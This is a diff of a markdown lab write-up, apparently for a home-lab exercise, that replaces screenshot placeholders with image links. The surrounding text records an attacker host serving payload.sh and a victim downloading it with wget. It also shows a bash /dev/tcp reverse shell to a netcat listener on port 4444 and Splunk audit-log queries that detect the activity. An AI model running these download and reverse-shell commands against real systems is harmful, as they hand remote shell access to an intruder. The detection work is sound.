@@ -3,7 +3,7 @@
 A PHP development server was started to host the payload file.
 
 **Add Screenshot 1 Here**  
-*(Kali terminal showing `php -S 0.0.0.0:80` and HTTP GET requests for payload.sh)*
+![Splunk Detection](images/webpapa.png)
 
 **Observation:**
 - Multiple HTTP GET requests observed
@@ -19,8 +19,7 @@ The victim system downloaded the payload from the attacker server.
 ```bash
 wget http://192.168.1.64/payload.sh
 
-Add Screenshot 2 Here
-(Ubuntu terminal showing successful wget download of payload.sh)
+![Splunk Detection](images/wgetpa.png)
 
 Observation:
 
@@ -32,8 +31,8 @@ The payload was executed manually on the victim system.
 
 bash -i >& /dev/tcp/192.168.1.64/4444 0>&1
 
-Add Screenshot 3 Here
-(Ubuntu terminal showing reverse shell command execution)
+![Splunk Detection](images/bashpa.png)
+
 
 4. Reverse Shell Connection (Attacker)
 
@@ -42,8 +41,7 @@ A connection was successfully established from the victim.
 
 nc -lvnp 4444
 
-Add Screenshot 4 Here
-(Kali terminal showing connection from 192.168.1.66 and successful shell access)
+![Splunk Detection](images/kalipa.png)
 
 Observation:
 
@@ -59,8 +57,7 @@ index=* source="/var/log/audit/audit.log"
 | rex "addr=(?<ip>\d+\.\d+\.\d+\.\d+)"
 | stats count by ip
 
-Add Screenshot 5 Here
-(Splunk results showing attacker IP 192.168.1.64 with event count)
+![Splunk Detection](images/splunkpa.png)
 
 Observation:
 
@@ -78,8 +75,7 @@ index=* source="/var/log/audit/audit.log"
 | search command="*bash*" OR command="*wget*" OR command="*tcp*"
 | table _time host command
 
-Add Screenshot 6 Here
-(Splunk showing reconstructed commands including bash execution)
+![Splunk Detection](images/splunkpa2.png)
 
 Observation:
 
